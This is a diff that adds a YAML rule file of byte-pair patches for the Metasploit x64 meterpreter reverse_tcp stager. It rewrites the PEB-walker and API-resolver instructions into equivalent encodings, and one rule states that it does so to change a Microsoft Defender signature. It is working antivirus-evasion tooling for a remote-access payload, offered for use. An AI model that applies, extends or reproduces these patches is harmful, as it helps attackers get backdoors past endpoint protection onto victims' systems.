@@ -1,0 +1,35 @@
+version: 1
+description: |
+  Targeted byte-pair patches for the Metasploit `windows/x64/meterpreter/
+  reverse_tcp` reflective stager.
+
+  Pattern provenance: the stager's `find_kernel32` prologue and its
+  WinINet API-hash resolver are widely published in the rapid7/metasploit-
+  framework public source tree (external/source/shellcode/windows/x64/src/
+  block/block_*.asm). The patterns below target the canonical 64-bit
+  PEB-walking prologue and the constant API hashes used by `block_api.asm`.
+
+  Equivalence class:
+    * the XOR pair  ->  SUB pair swap is the same audited rewrite that
+      ships in the Donut pack (CF, OF dead at the rewrite site);
+    * the MOV r/m64,r64 (89) <-> MOV r64,r/m64 (8B) byte swap preserves
+      the destination register and clobbers no flags.
+
+rules:
+  - id: x64.msf.peb_walker_zero_rcx
+    description: "PEB walker xor rcx,rcx  ->  sub rcx,rcx (changes Defender atom)"
+    raw:
+      from: "65 48 8B 04 25 60 00 00 00 48 31 C9"
+      to:   "65 48 8B 04 25 60 00 00 00 48 29 C9"
+    flags_effect: equivalent_if { CF, OF dead }
+    size_delta: 0
+    weight: 1.0
+
+  - id: x64.msf.block_api_mov_rsi_rdi_alt
+    description: "block_api mov rsi, rdi (89-form)  ->  same insn (8B-form, flipped ModR/M)"
+    raw:
+      from: "48 89 FE 48 89 D6"
+      to:   "48 8B F7 48 89 D6"
+    flags_effect: equivalent
+    size_delta: 0
+    weight: 1.0
